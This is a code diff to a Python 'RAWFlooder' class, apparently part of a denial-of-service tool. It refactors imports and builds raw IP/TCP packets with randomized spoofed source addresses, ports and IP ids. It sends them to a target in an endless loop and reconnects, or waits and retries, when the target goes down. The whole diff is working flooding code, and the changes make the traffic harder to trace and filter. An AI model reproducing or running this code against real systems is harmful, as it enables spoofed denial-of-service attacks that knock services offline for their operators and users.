@@ -1,8 +1,11 @@
-import socket
-import sys
-import random
 from role import flooder
+from time import sleep
 from struct import pack
+from socket import socket, inet_aton, htons
+from socket import AF_INET, SOCK_RAW, IPPROTO_RAW
+from socket import error as socket_error
+from random import randint
+from sys import exit
 
 
 class RAWFlooder(flooder.Flooder):
@@ -13,28 +16,28 @@ class RAWFlooder(flooder.Flooder):
 
 	def run(self):
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-		except socket.error:
-			sys.exit()
+			s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
+		except socket_error:
+			exit()
 
-		source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-		dest_ip = self.ip
+		# Randomize the source address
+		source_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
 
-		# IP header fields
+		# IP header
 		ip_ihl = 5
 		ip_ver = 4
 		ip_tos = 0
 		ip_tot_len = 0
-		ip_id = 54321
+		ip_id = randint(0, 100000)
 		ip_frag_off = 0
 		ip_ttl = 255
-		ip_proto = socket.IPPROTO_TCP
+		ip_proto = self.socket_protocol
 		ip_check = 0
-		ip_saddr = socket.inet_aton(source_ip)
-		ip_daddr = socket.inet_aton(dest_ip)
-
+		ip_saddr = inet_aton(source_ip)
+		ip_daddr = inet_aton(self.ip)
 		ip_ihl_ver = (ip_ver << 4) + ip_ihl
 
+		# Pack the IP header
 		ip_header = pack(
 			'!BBHHHBBH4s4s',
 			ip_ihl_ver,
@@ -49,8 +52,8 @@ class RAWFlooder(flooder.Flooder):
 			ip_daddr
 		)
 
-		# TCP header fields
-		tcp_source = 6969
+		# TCP header
+		tcp_source = randint(1, 65535)
 		tcp_dest = int(self.port)
 		tcp_seq = 454
 		tcp_ack_seq = 0
@@ -63,13 +66,13 @@ class RAWFlooder(flooder.Flooder):
 		tcp_psh = 0
 		tcp_ack = 0
 		tcp_urg = 0
-		tcp_window = socket.htons(5840)
+		tcp_window = htons(5840)
 		tcp_check = 0
 		tcp_urg_ptr = 0
-
 		tcp_offset_res = (tcp_doff << 4) + 0
 		tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
 
+		# Pack the TCP header
 		tcp_header = pack(
 			'!HHLLBBHHH',
 			tcp_source,
@@ -83,19 +86,21 @@ class RAWFlooder(flooder.Flooder):
 			tcp_urg_ptr
 		)
 
+		# Pseudo header
 		msg = self.get_random_message()
-
-		# Pseudo header fields
-		source_address = socket.inet_aton(source_ip)
-		dest_address = socket.inet_aton(dest_ip)
+		source_address = inet_aton(source_ip)
+		dest_address = inet_aton(self.ip)
 		placeholder = 0
 		tcp_length = len(tcp_header) + len(msg)
 
+		# Pack the pseudo header
 		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, self.socket_protocol, tcp_length)
-		psh = psh + tcp_header + msg
+		psh = psh + tcp_header + pack('!' + str(len(msg)) + 's', msg)
 
+		# Verify bytes on the pseudo header
 		tcp_check = self.checksum(psh)
 
+		# Pack the TCP header
 		tcp_header = pack(
 			'!HHLLBBH',
 			tcp_source,
@@ -113,13 +118,15 @@ class RAWFlooder(flooder.Flooder):
 		try:
 			while True:
 				try:
-					s.sendto(packet, (dest_ip, int(self.port)))
-				except socket.error:
+					s.sendto(packet, (self.ip, int(self.port)))
+				except socket_error:
 					try:
 						s.close()
-						s = socket.socket(socket.AF_INET, self.socket_type)
+						s = socket(AF_INET, self.socket_type)
 						s.connect((self.ip, int(self.port)))
-					except socket.error:
-						print('Reconnecting...')
+						print('Socket error...reconnecting')
+					except socket_error:
+						print('Target down. Waiting %s seconds before reconnecting' % 10)
+						sleep(10)
 		except KeyboardInterrupt:
-			sys.exit()
+			exit()
